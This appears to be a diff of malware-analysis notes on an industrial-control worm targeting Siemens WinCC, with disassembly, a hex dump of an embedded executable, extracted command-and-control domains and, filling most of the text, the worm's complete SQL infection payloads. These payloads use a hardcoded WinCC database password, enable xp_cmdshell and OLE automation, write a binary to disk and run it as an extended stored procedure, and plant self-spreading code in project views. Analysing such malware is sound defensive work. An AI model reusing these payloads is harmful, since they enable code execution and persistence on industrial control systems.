@@ -1,0 +1,156 @@
+
+Checks windows version, if major version 5 then extract:
+
+
+Search for .stub section:
+
+10001199   loc_10001199:
+10001199       push 0x100032B8 // .stub
+1000119E       push edi
+1000119F       call dword ptr [0x10003010] // __imp_KERNEL32.dll!lstrcmpiA[7C80B929]
+100011A5   loc_100011A5:
+100011A5       test eax,eax
+100011A7       je 0x100011BB? // loc_100011BB
+
+
+Validate .stub section size and first 4 bytes
+
+100011BB   loc_100011BB:
+100011BB       mov ecx,dword ptr [edi+0x8]
+100011BE       cmp ecx,0x0000022C
+100011C4       jb 0x100011B5? // loc_100011B5
+100011C6   loc_100011C6:
+100011C6       mov eax,dword ptr [edi+0xC]
+100011C9       add eax,dword ptr [0x1000401C] // IMAGEBASE_data_1000401C
+100011CF       cmp dword ptr [eax],0xAE39120D
+100011D5       jne 0x100011B5? // loc_100011B5
+
+.stub section contains embedded exe with partially masked MZ header:
+
+10006000 :     0D 12 39 AE 28 02 00 00 00 9A 07 00 28 9C 07 00 ..9.(.......(...
+10006010 :     5A 00 00 00 82 9C 07 00 F3 1C 00 00 00 00 00 00 Z...............
+10006020 :     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+10006030 :     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+10006040 :     F0 00 00 00 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C ............!..L
+10006050 :     CD                                              .
+10006051   ASCII: !This program cannot be run in DOS mode....
+10006051 :     21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 !This program ca
+10006061 :     6E 6E 6F 74 20 62 65 20 72 75 6E 20 69 6E 20 44 nnot be run in D
+10006071 :     4F 53 20 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 OS mode....$....
+10006081 :     00 00 00 A9 74 04 F3 ED 15 6A A0 ED 15 6A A0 ED ....t....j...j..
+10006091 :     15 6A A0 E4 6D FF A0 EC 15 6A A0 E4 6D E9 A0 EF .j..m....j..m...
+100060A1 :     15 6A A0 CA D3 11 A0 E8 15 6A A0 ED 15 6B A0 F8 .j.......j...k..
+100060B1 :     15 6A A0 CA D3 17 A0 EC 15 6A A0 E4 6D E3 A0 EF .j.......j..m...
+100060C1 :     15 6A A0 E4 6D F8 A0 EC 15 6A A0 E4 6D FB A0 EC .j..m....j..m...
+100060D1 :     15 6A A0 52 69 63 68 ED 15 6A A0 00 00 00 00 00 .j.Rich..j......
+100060E1 :     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+100060F1 :     00 00 00 50 45 00 00 4C 01 05 00 23 56 8B 4B 00 ...PE..L...#V.K.
+
+RAW BYTES FROM FILE:
+00002600   0D 12 39 AE 28 02 00 00  00 9A 07 00 28 9C 07 00   ..9®(....š..(œ..
+00002610   5A 00 00 00 82 9C 07 00  F3 1C 00 00 00 00 00 00   Z...‚œ..ó.......
+00002620   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
+00002630   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
+00002640   F0 00 00 00 0E 1F BA 0E  00 B4 09 CD 21 B8 01 4C   ð.....º..´.Í!¸.L
+00002650   CD 21 54 68 69 73 20 70  72 6F 67 72 61 6D 20 63   Í!This program c
+00002660   61 6E 6E 6F 74 20 62 65  20 72 75 6E 20 69 6E 20   annot be run in 
+00002670   44 4F 53 20 6D 6F 64 65  2E 0D 0D 0A 24 00 00 00   DOS mode....$...
+00002680   00 00 00 00 A9 74 04 F3  ED 15 6A A0 ED 15 6A A0   ....©t.óí.j í.j 
+00002690   ED 15 6A A0 E4 6D FF A0  EC 15 6A A0 E4 6D E9 A0   í.j ämÿ ì.j ämé 
+000026A0   EF 15 6A A0 CA D3 11 A0  E8 15 6A A0 ED 15 6B A0   ï.j ÊÓ. è.j í.k 
+000026B0   F8 15 6A A0 CA D3 17 A0  EC 15 6A A0 E4 6D E3 A0   ø.j ÊÓ. ì.j ämã 
+000026C0   EF 15 6A A0 E4 6D F8 A0  EC 15 6A A0 E4 6D FB A0   ï.j ämø ì.j ämû 
+000026D0   EC 15 6A A0 52 69 63 68  ED 15 6A A0 00 00 00 00   ì.j Richí.j ....
+000026E0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
+000026F0   00 00 00 00 50 45 00 00  4C 01 05 00 23 56 8B 4B   ....PE..L...#V‹K
+
+
+STUB is decompressed/extracted to memory
+
+
+
+
+00DC5E07: 0x00E029B0 -> Unicode: Global\{CAA6BD26-6C7B-4af0-95E2-53DE46FDDF26}
+
+ECX: 0x00FDF7B8 Unicode: www.windowsupdate.com
+ECX: 0x00FDF838 Unicode: www.msn.com
+
+ECX: 0x00FDF8B8 Unicode: www.mypremierfutbol.com
+ECX: 0x00FDF938 Unicode: index.php?data
+ECX: 0x00FDF9B8 Unicode: www.todaysfutbol.com
+
+00FDFB54: 0x00FDFB6C -> Unicode: C:\DOCUME~1\admin\LOCALS~1\Temp\
+00DE31EC: 0x00AB3C48 -> Unicode: C:\DOCUME~1\admin\LOCALS~1\Temp\~DF1.tmp
+00FDFB7C: 0x00FDFBFC -> Unicode: C:\DOCUME~1\admin\LOCALS~1\Temp\~DF2.tmp
+
+EDI: 0x00AB2490 Ascii: OFILE=C:\Documents and Settings\
+EBX: 0x00FDFBFC Unicode: C:\DOCUME~1\admin\LOCALS~1\Temp\~DF3.tmp
+
+ view MCPVPROJECT2 as   select MCPTPROJECT.PROJECTID,    MCPTPROJECT.PROJECTNAME,    MCPTPROJECT.PROJECTVERSION,    MCPTPROJECT.PROJECTMODE,    MCPTPROJECT.PROJECTCREATOR,    MCPTPROJECT.PROJECTEDITOR,    MCPTPROJECT.CREATIONDATE,    MCPTPROJECT.EDITDATE,    MCPTPROJECT.PRJCOMMENT,    MCPTPROJECT.CSLANGUAGE,    MCPTPROJECT.RTLANGUAGE,    MCPTPROJECT.PROJECTGUID,    MCPTPROJECT.PRJTABLETYPES,    MCPTPROJECT.PRJDATATYPES,    MCPTPROJECT.PRJCREATEVERMAJ,    MCPTPROJECT.PRJCREATEVERMIN,    MCPTPROJECT.PRJXRES,    MCPTPROJECT.PRJTIMEMODE,    MCPTPROJECT.PRJDELTAMODE,    MCPTPROJECT.PRJDELTAREMOTE   from MCPTPROJECT
+
+
+ view MCPVPROJECT2 as select MCPTPROJECT.PROJECTID,MCPTPROJECT.PROJECTNAME,MCPTPROJECT.PROJECTVERSION,MCPTPROJECT.PROJECTMODE,MCPTPROJECT.PROJECTCREATOR,MCPTPROJECT.PROJECTEDITOR,MCPTPROJECT.CREATIONDATE,MCPTPROJECT.EDITDATE,MCPTPROJECT.PRJCOMMENT,MCPTPROJECT.CSLANGUAGE,MCPTPROJECT.RTLANGUAGE,MCPTPROJECT.PROJECTGUID,MCPTPROJECT.PRJTABLETYPES,MCPTPROJECT.PRJDATATYPES,MCPTPROJECT.PRJCREATEVERMAJ,MCPTPROJECT.PRJCREATEVERMIN,MCPTPROJECT.PRJXRES,MCPTPROJECT.PRJTIMEMODE,MCPTPROJECT.PRJDELTAMODE,MCPTPROJECT.PRJDELTAREMOTE from MCPTPROJECT
+
+
+ view MCPVPROJECT2 as select PROJECTID,PROJECTNAME,PROJECTVERSION,PROJECTMODE,PROJECTCREATOR,PROJECTEDITOR,CREATIONDATE,EDITDATE,PRJCOMMENT,CSLANGUAGE,RTLANGUAGE,PROJECTGUID,PRJTABLETYPES,PRJDATATYPES,PRJCREATEVERMAJ,PRJCREATEVERMIN,PRJXRES,PRJTIMEMODE,PRJDELTAMODE,PRJDELTAREMOTE from MCPTPROJECT where ((SELECT top 1 1 FROM MCPVREADVARPERCON)='1')                                                                                
+
+                                                                                                                                                                                        
+ view MCPVREADVARPERCON as     select MCPTVARIABLEDESC.VARIABLEID,         MCPTVARIABLEDESC.VARIABLETYPEID,         MCPTVARIABLEDESC.FORMATFITTING,          MCPTVARIABLEDESC.SCALEID,            MCPTVARIABLEDESC.VARIABLENAME,           MCPTVARIABLEDESC.ADDRESSPARAMETER,          MCPTVARIABLEDESC.PROTOKOLL,          MCPTVARIABLEDESC.MAXLIMIT,           MCPTVARIABLEDESC.MINLIMIT,           MCPTVARIABLEDESC.STARTVALUE,         MCPTVARIABLEDESC.SUBSTVALUE,         MCPTVARIABLEDESC.VARFLAGS,           MCPTVARIABLEDESC.CONNECTIONID,         MCPTVARIABLEDESC.VARPROPERTY,          MCPTVARIABLEDESC.CYCLETIMEID,          MCPTVARIABLEDESC.LASTCHANGE,          MCPTVARIABLEDESC.ASDATASIZE,          MCPTVARIABLEDESC.OSDATASIZE,          MCPTVARIABLEDESC.VARGROUPID,          MCPTVARIABLEDESC.VARXRES,          MCPTVARIABLEDESC.VARMARK, 		 MCPTVARIABLEDESC.SCALETYPE, 		 MCPTVARIABLEDESC.SCALEPARAM1, 		 MCPTVARIABLEDESC.SCALEPARAM2, 		 MCPTVARIABLEDESC.SCALEPARAM3, 		 MCPTVARIABLEDESC.SCALEPARAM4   from MCPTVARIABLEDESC
+
+ view MCPVREADVARPERCON as     select MCPTVARIABLEDESC.VARIABLEID,   MCPTVARIABLEDESC.VARIABLETYPEID,   MCPTVARIABLEDESC.FORMATFITTING,    MCPTVARIABLEDESC.SCALEID,      MCPTVARIABLEDESC.VARIABLENAME,     MCPTVARIABLEDESC.ADDRESSPARAMETER,    MCPTVARIABLEDESC.PROTOKOLL,    MCPTVARIABLEDESC.MAXLIMIT,     MCPTVARIABLEDESC.MINLIMIT,     MCPTVARIABLEDESC.STARTVALUE,   MCPTVARIABLEDESC.SUBSTVALUE,   MCPTVARIABLEDESC.VARFLAGS,     MCPTVARIABLEDESC.CONNECTIONID,   MCPTVARIABLEDESC.VARPROPERTY,    MCPTVARIABLEDESC.CYCLETIMEID,    MCPTVARIABLEDESC.LASTCHANGE,    MCPTVARIABLEDESC.ASDATASIZE,    MCPTVARIABLEDESC.OSDATASIZE,    MCPTVARIABLEDESC.VARGROUPID,    MCPTVARIABLEDESC.VARXRES,    MCPTVARIABLEDESC.VARMARK, 	 MCPTVARIABLEDESC.SCALETYPE, 	 MCPTVARIABLEDESC.SCALEPARAM1, 	 MCPTVARIABLEDESC.SCALEPARAM2, 	 MCPTVARIABLEDESC.SCALEPARAM3, 	 MCPTVARIABLEDESC.SCALEPARAM4   from MCPTVARIABLEDESC
+
+
+ view MCPVREADVARPERCON as select MCPTVARIABLEDESC.VARIABLEID,MCPTVARIABLEDESC.VARIABLETYPEID,MCPTVARIABLEDESC.FORMATFITTING,MCPTVARIABLEDESC.SCALEID,MCPTVARIABLEDESC.VARIABLENAME,MCPTVARIABLEDESC.ADDRESSPARAMETER,MCPTVARIABLEDESC.PROTOKOLL,MCPTVARIABLEDESC.MAXLIMIT,MCPTVARIABLEDESC.MINLIMIT,MCPTVARIABLEDESC.STARTVALUE,MCPTVARIABLEDESC.SUBSTVALUE,MCPTVARIABLEDESC.VARFLAGS,MCPTVARIABLEDESC.CONNECTIONID,MCPTVARIABLEDESC.VARPROPERTY,MCPTVARIABLEDESC.CYCLETIMEID,MCPTVARIABLEDESC.LASTCHANGE,MCPTVARIABLEDESC.ASDATASIZE,MCPTVARIABLEDESC.OSDATASIZE,MCPTVARIABLEDESC.VARGROUPID,MCPTVARIABLEDESC.VARXRES,MCPTVARIABLEDESC.VARMARK,MCPTVARIABLEDESC.SCALETYPE,MCPTVARIABLEDESC.SCALEPARAM1,MCPTVARIABLEDESC.SCALEPARAM2,MCPTVARIABLEDESC.SCALEPARAM3,MCPTVARIABLEDESC.SCALEPARAM4 from MCPTVARIABLEDESC
+
+
+ view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMIT,MINLIMIT,STARTVALUE,SUBSTVALUE,VARFLAGS,CONNECTIONID,VARPROPERTY,CYCLETIMEID,LASTCHANGE,ASDATASIZE,OSDATASIZE,VARGROUPID,VARXRES,VARMARK,SCALETYPE,SCALEPARAM1,SCALEPARAM2,SCALEPARAM3,SCALEPARAM4 from MCPTVARIABLEDESC,openrowset('SQLOLEDB','Server=.\WinCC;uid=WinCCConnect;pwd=2WSXcder','select 0;declare @t varchar(999),@s varchar(999),@a int declare r cursor for select filename from master..sysdatabases where (name like ''CC%'') open r fetch next from r into @t while (@@fetch_status<>-1) begin set @t=left(@t,len(@t)-charindex(''\'',reverse(@t)))+''\GraCS\cc_tlg7.sav'';exec master..xp_fileexist @t,@a out;if @a=1 begin set @s = ''master..xp_cmdshell ''''extrac32 /y "''+@t+''" "''+@t+''x"'''''';exec(@s);set @t=@t+''x'';dbcc addextendedproc(sp_run,@t);exec master..sp_run;exec master..sp_dropextendedproc sp_run;break;end fetch next from r into @t end close r deallocate r')      
+
+
+ view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMIT,MINLIMIT,STARTVALUE,SUBSTVALUE,VARFLAGS,CONNECTIONID,VARPROPERTY,CYCLETIMEID,LASTCHANGE,ASDATASIZE,OSDATASIZE,VARGROUPID,VARXRES,VARMARK,SCALETYPE,SCALEPARAM1,SCALEPARAM2,SCALEPARAM3,SCALEPARAM4 from MCPTVARIABLEDESC,openrowset('SQLOLEDB','Server=.\WinCC;uid=WinCCConnect;pwd=2WSXcder','select 0;use master;declare @t varchar(999),@s varchar(999);select @t=filename from master..sysdatabases where (name like ''CC%'');set @t=left(@t,len(@t)-charindex(''\'',reverse(@t)))+''\GraCS\cc_tlg7.sav'';set @s = ''master..xp_cmdshell ''''extrac32 /y "''+@t+''" "''+@t+''x"'''''';exec(@s);set @t = @t+''x'';dbcc addextendedproc(sprun,@t);exec master..sprun;exec master..sp_dropextendedproc sprun')                                                                         
+ view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMIT,MINLIMIT,STARTVALUE,SUBSTVALUE,VARFLAGS,CONNECTIONID,VARPROPERTY,CYCLETIMEID,LASTCHANGE,ASDATASIZE,OSDATASIZE,VARGROUPID,VARXRES,VARMARK,SCALETYPE,SCALEPARAM1,SCALEPARAM2,SCALEPARAM3,SCALEPARAM4 from MCPTVARIABLEDESC,openrowset('SQLOLEDB','Server=.\WinCC;uid=WinCCConnect;pwd=2WSXcder','select 0;use master;declare @t varchar(999),@s varchar(999);select @t=filename from master..sysdatabases where (name like ''CC%R'');set @t=left(@t,len(@t)-charindex(''\'',reverse(@t)))+''\GraCS\cc_tlg7.sav'';set @s = ''master..xp_cmdshell ''''extrac32 /y "''+@t+''" "''+@t+''x"'''''';exec(@s);set @t = @t+''x'';dbcc addextendedproc(sp_run,@t);exec master..sp_run;')      
+
+
+
+  EXEC sp_dropextendedproc sp_dumpdbilog 
+
+ ((SELECT top 1 1 FROM MCPVREADVARPERCON)='1') --CC-SP
+
+ 0;set IMPLICIT_TRANSACTIONS off;declare @z nvarchar(999);set @z=''use [?];declare @t nvarchar(2000);declare @s nvarchar(9);set @s=''''--CC-S''''+char(80);if left(db_name(),2)=''''CC'''' select @t=substring(text,charindex(@s,text)+8,charindex(''''--*'''',text)-charindex(@s,text)-8) from syscomments where text like (''''%''''+@s+''''%'''');if @t is not NULL exec(@t)'';exec sp_msforeachdb @z')
+
+
+ CREATE TABLE sysbinlog ( abin image ) INSERT INTO sysbinlog VALUES(0x
+
+ DECLARE @ashl int,         @aind varchar(260),         @ainf varchar(260),         @hr int EXEC @hr = sp_OACreate 'WScript.Shell', @ashl OUT IF @hr <> 0 GOTO endq EXEC sp_OAMethod @ashl, 'ExpandEnvironmentStrings',                 @aind OUT, '%%ALLUSERSPROFILE%%' SET @ainf = @aind + '\sql%05x.dbi'   EXEC sp_addextendedproc sp_dumpdbilog, @ainf  EXEC sp_dumpdbilog   EXEC sp_dropextendedproc sp_dumpdbilog  endq: 
+ 
+
+DECLARE @ashl int,         @aind varchar(260),         @ainf varchar(260),         @hr int EXEC @hr = sp_OACreate 'WScript.Shell', @ashl OUT IF @hr <> 0 GOTO endq EXEC sp_OAMethod @ashl, 'ExpandEnvironmentStrings',                 @aind OUT, '%%ALLUSERSPROFILE%%' SET @ainf = @aind + '\sql%05x.dbi'  DECLARE @aods int, 	       @adss int, 	       @aip int, 	       @abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @aods, 'Type', 1 IF @hr <> 0 GOTO endq EXEC @hr = sp_OAMethod @aods, 'Open', null IF @hr <> 0 GOTO endq SET @adss = ( SELECT DATALENGTH(abin) FROM sysbinlog ) SET @aip = 1 WHILE ( @aip <= @adss )  BEGIN  SET @abf = ( SELECT SUBSTRING (abin, @aip, 4096 ) FROM sysbinlog )  EXEC @hr = sp_OAMethod @aods, 'Write', null, @abf  IF @hr <> 0 GOTO endq   SET @aip = @aip + 4096  END EXEC @hr = sp_OAMethod @aods, 'SaveToFile', null, @ainf, 2 IF @hr <> 0 GOTO endq  EXEC sp_OAMethod @aods, 'Close', null endq: 
+ 
+
+DECLARE @ashl int,         @aind varchar(260),         @ainf varchar(260),         @hr int EXEC @hr = sp_OACreate 'WScript.Shell', @ashl OUT IF @hr <> 0 GOTO endq EXEC sp_OAMethod @ashl, 'ExpandEnvironmentStrings',                 @aind OUT, '%%ALLUSERSPROFILE%%' SET @ainf = @aind + '\sql%05x.dbi'  DECLARE @fs int  EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @fs OUT IF @hr <> 0 GOTO endq EXECUTE sp_OAMethod @fs, 'DeleteFile', NULL, @ainf endq: 
+ DECLARE @vr varchar(256) SET @vr = CONVERT(varchar(256), (SELECT serverproperty('productversion') )) IF @vr > '9' BEGIN	EXEC sp_configure 'show advanced options', 1  RECONFIGURE WITH OVERRIDE	EXEC sp_configure 'Ole Automation Procedures', 1	RECONFIGURE WITH OVERRIDE END
+
+ DROP TABLE sysbinlog
+
+declare @t varchar(4000), @e int, @f int if exists (select * from dbo.syscomments where id=object_id(N'[dbo].[MCPVPROJECT2]')) select @t=rtrim(c.text) from dbo.syscomments c, dbo.sysobjects o     where o.id = c.id and c.id = object_id(N'[dbo].[MCPVPROJECT2]') order by c.number, c.colid  set @e=charindex('--CC-SP',@t)  if @e=0  begin set @f=charindex('where',@t) if @f<>0 set @t=left(@t,@f-1) set @t=right(@t,len(@t)-6)  end else  select * from fail_in_order_to_return_false  set @t='alter '+@t+' where ((SELECT top 1 1 FROM MCPVREADVARPERCON)=''1'') --CC-SP use master;declare @t varchar(999),@s varchar(999),@a int declare r cursor for select filename from master..sysdatabases where (name like ''CC%'') open r fetch next from r into @t while (@@fetch_status<>-1) begin set @t=left(@t,len(@t)-charindex(''\'',reverse(@t)))+''\GraCS\cc_tlg7.sav'';exec master..xp_fileexist @t,@a out;if @a=1 begin set @s = ''master..xp_cmdshell ''''extrac32 /y "''+@t+''" "''+@t+''x"'''''';exec(@s);set @t = @t+''x'';dbcc addextendedproc(sp_payload,@t);exec master..sp_payload;exec master..sp_dropextendedproc sp_payload;break; end fetch next from r into @t end close r deallocate r --*' exec (@t)  
+
+
+declare @t varchar(4000), @e int, @f int if exists (select text from dbo.syscomments where id=object_id(N'[dbo].[MCPVREADVARPERCON]')) select @t=rtrim(text) from dbo.syscomments c, dbo.sysobjects o where o.id = c.id and c.id = object_id(N'[dbo].[MCPVREADVARPERCON]') set @e=charindex(',openrowset',@t) if @e=0 set @t=right(@t,len(@t)-7) else begin set @f=charindex('sp_msforeachdb',@t) if @f=0 begin set @t=left(@t,@e-1) set @t=right(@t,len(@t)-7)  end else select * from fail_in_order_to_return_false end set @t='alter '+@t+',openrowset(''SQLOLEDB'',''Server=.\WinCC;uid=WinCCConnect;pwd=2WSXcder'',''select 0;set IMPLICIT_TRANSACTIONS off;declare @z nvarchar(999);set @z=''''use [?];declare @t nvarchar(2000);declare @s nvarchar(9);set @s=''''''''--CC-S''''''''+char(80);if left(db_name(),2)=''''''''CC'''''''' select @t=substring(text,charindex(@s,text)+8,charindex(''''''''--*'''''''',text)-charindex(@s,text)-8) from syscomments where text like (''''''''%''''''''+@s+''''''''%'''''''');if @t is not NULL exec(@t)'''';exec sp_msforeachdb @z'')' exec (@t) 
+
+exec master..sp_attach_db 'wincc_svr',N'%s',N'%s'
+
+exec master..sp_detach_db 'wincc_svr'
+
+Provider='%s';Data Source=%s;Initial Catalog='%s';User ID='%s';Password='%s';Connection Timeout=%i;
+
+select name from master..sysdatabases where filename like N'%s'
+
+use [%s]
+
+use master
+
+use wincc_svr
+
+
+CCProjectMgr.exe
+
+
